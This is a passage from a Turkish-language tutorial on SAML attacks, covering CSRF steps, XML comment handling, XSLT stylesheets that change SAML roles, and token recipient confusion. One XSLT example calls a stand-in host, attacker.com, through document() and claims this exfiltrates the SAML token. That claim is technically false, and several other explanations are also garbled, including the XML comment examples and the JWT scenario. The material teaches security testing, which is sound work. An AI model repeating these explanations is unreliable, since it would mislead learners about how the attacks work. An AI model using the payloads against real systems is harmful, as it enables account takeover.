- SAML isteklerini oluşturmak: Saldırı için SAML isteklerini oluşturmanız gerekmektedir. Saldırıya hedef olan işlemi gerçekleştiren SAML mesajını hazırlamalısınız. Bu mesaj, hedef uygulamada istenilen eylemi gerçekleştirecek şekilde düzenlenmelidir.
- Saldırıyı tetiklemek: Hazırladığınız sahte HTML sayfasını hedef kullanıcılara ulaştırarak saldırıyı tetiklemeniz gerekmektedir. Bu sayfa, kullanıcıyı hedef uygulamada oturum açmaya veya belirli bir işlemi gerçekleştirmeye yönlendiren içeriği içermelidir.
- Saldırının etkisini değerlendirmek: Saldırıyı gerçekleştirdikten sonra, hedef uygulamada istenilen eylemin gerçekleşip gerçekleşmediğini kontrol etmelisiniz. Örneğin, hedef uygulamada bir işlem başarıyla tamamlanmışsa saldırının başarılı olduğunu söyleyebilirsiniz.

**Not: bu bir CSRF olduğundan dolayı size bununla ilgili örnek kod vermek istemiyorum. Sebebi yasal olarak CSRF'i diğer herhangi bir güvenlik açığına göre daha çok illegal bulmam artı olarak zaten pek çok şirket size uygulamaları üzerinde CSRF bulduğunuz için bir şey vermez. O yüzden bu kısmı daha fazla detaylandırmayı es geçip devam edeceğim. Anlayışınız için teşekkür ederim.**

## XML Comment Handling

XML yorumlarının doğru bir şekilde işlenmediği bir güvenlik zafiyetini tanımlamaktadır. XML yorumları, XML belgelerinde metinlerin etrafına yerleştirilen özel işaretlerdir. Yorumlar, XML belgesinin içeriğini açıklamak veya belgenin okunması veya bakımı için notlar eklemek için kullanılır. Ancak, yetersiz bir XML yorum işleme uygulaması, yetkisiz erişime sahip bir saldırganın başka bir kullanıcı olarak kimlik doğrulamasını sağlayabileceği bir zafiyete neden olabilir.

Aşağıda, bu zafiyeti daha iyi anlamanızı sağlamak için gerçek hayata yakın örnekler ve kodlar bulunmaktadır:

- Örnek 1: Yetkisiz Kimlik Doğrulama

```
<user>
  <username>JohnDoe</username>
  <password>secretpassword</password>
  <!-- Admin user -->
  <!-- <role>admin</role> -->
</user>

```

Bu örnekte, kullanıcının rolünü tanımlayan `<role>` öğesi yorum içine alınmıştır. Bu yorum, kullanıcının yönetici rolüne sahip olmasını sağlar. Ancak, yetersiz bir XML yorum işleme mekanizması, yorumları atlayarak veya işlemeyerek kullanıcıyı yönetici olarak kimlik doğrulayabilir.

- Örnek 2: Yetkisiz Veri Değiştirme

```
<order>
  <id>12345</id>
  <status>pending</status>
  <!-- Delivery date postponed -->
  <!-- <status>delivered</status> -->
</order>
```
Bu örnekte, siparişin durumunu belirten `<status>` öğesi yorum içine alınmıştır. Yorumlar, siparişin teslim edildiğini belirten durumu geçersiz kılabilir. Yetersiz bir XML yorum işleme mekanizması, yorumları işlemeyerek saldırganın siparişin durumunu değiştirmesine izin verebilir.

## XSLT (eXtensible Stylesheet Transformation Language)

SAML (Security Assertion Markup Language) uygulamalarına karşı kullanılabilecek bir güvenlik zafiyetini ifade etmektedir.

XSLT, XML tabanlı bir dönüşüm dilidir ve XML belgelerini farklı bir formata dönüştürmek veya içeriğini değiştirmek için kullanılır. SAML, kimlik doğrulama ve yetkilendirme bilgilerini paylaşmak için kullanılan bir standarttır. SAML tabanlı bir uygulama, kimlik sağlayıcıya (IdP) kullanıcı kimlik bilgilerini gönderir ve IdP, kullanıcının kimlik doğrulamasını gerçekleştirir ve uygulamaya kimlik bilgilerini (SAML token) sağlar.

XSLT saldırısı, SAML tabanlı uygulamaların güvenlik açığını sömürerek kimlik bilgilerini ele geçirmeye veya yetkilendirme mekanizmasını atlamaya yönelik bir saldırıdır. Aşağıda, bu zafiyeti daha iyi anlamanızı sağlamak için gerçek hayata yakın örnekler ve kodlar bulunmaktadır:

- Örnek 1: SAML Kimlik Bilgilerinin Ele Geçirilmesi

```
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:AttributeStatement>
    <saml:Attribute Name="username" Value="JohnDoe"/>
    <saml:Attribute Name="role" Value="admin"/>
  </saml:AttributeStatement>
</saml:Assertion>

```
Saldırgan, XSLT saldırısını kullanarak SAML token'ını ele geçirmeye çalışır. Aşağıdaki XSLT kodu, SAML token'ının tamamını saldırganın kontrol ettiği bir sunucuya gönderir:

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="text"/>
  
  <xsl:template match="/">
    <xsl:value-of select="document('http://attacker.com/token.xml')"/>
  </xsl:template>
</xsl:stylesheet>
```
Saldırgan, XSLT dönüşüm işlemi sırasında document() fonksiyonunu kullanarak uzaktaki bir kaynaktan XML'i alır. Bu şekilde, saldırganın kontrolündeki sunucuda SAML token'ı ele geçirilmiş olur.

- Örnek 2: Yetkilendirme Mekanizmasının Atlama

```
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:AttributeStatement>
    <saml:Attribute Name="username" Value="JohnDoe"/>
    <saml:Attribute Name="role" Value="user"/>
  </saml:AttributeStatement>
</saml:Assertion>

```
Saldırgan, XSLT saldırısını kullanarak kullanıcı rolünü değiştirmeye çalışır ve yönetici rolüne erişmeyi hedefler. Aşağıdaki XSLT kodu, SAML token'ındaki rolü değiştirir:
```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml"/>
  
  <xsl:template match="/">
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
      <saml:AttributeStatement>
        <saml:Attribute Name="username">
          <xsl:value-of select="saml:AttributeStatement/saml:Attribute[@Name='username']/@Value"/>
        </saml:Attribute>
        <saml:Attribute Name="role" Value="admin"/>
      </saml:AttributeStatement>
    </saml:Assertion>
  </xsl:template>
</xsl:stylesheet>

```

Saldırgan, XSLT dönüşüm işlemi sırasında `<saml:Attribute Name="role" Value="admin"/>` satırını ekleyerek rolü değiştirir. Böylece, saldırgan yönetici yetkilerine sahip bir kullanıcı olarak kabul edilebilir.

## Token Recipient Confusion

"Token Recipient Confusion" olarak adlandırılan bu güvenlik açığı, bir saldırganın kendi kimlik doğrulama belirteci (token) ile başka bir kullanıcının hesabına giriş yapabilmesini sağlayan bir zafiyeti ifade eder.

Bu zafiyet, genellikle bir yetkilendirme veya kimlik doğrulama sistemindeki hatalı yapılandırmalardan kaynaklanır. Sistem, saldırganın kimlik doğrulama belirteciyle bir kullanıcı olduğunu yanlışlıkla kabul eder ve saldırganı hedef kullanıcının hesabına erişim sağlar. Böylece, saldırgan, hedef kullanıcının yetkilerini kullanabilir ve hassas bilgilere erişebilir.

Örnek Senaryo:

Sistem, kimlik doğrulama için bir JWT (JSON Web Token) kullanıyor olsun. İşte bir örnek JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
Saldırgan, bu JWT'yi alır ve hedef kullanıcının hesabına erişmek için kullanır. Sistem, saldırganın gönderdiği bu JWT'yi geçerli bir kimlik doğrulama belirteci olarak kabul eder ve saldırganı hedef kullanıcının oturum açmış gibi kabul eder. Bu durumda saldırgan, hedef kullanıcının hesabına erişim sağlar ve o hesabın yetkilerini kullanabilir.


# Lablar ve Kaynaklar

- https://research.aurainfosec.io/bypassing-saml20-SSO/
- https://github.com/yogisec/VulnerableSAMLApp
- https://github.com/dogangcr/vulnerable-sso
- http://sso-attacks.org/Category:Attack_Categorisation_By_Attack_on_SAML
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/
- https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md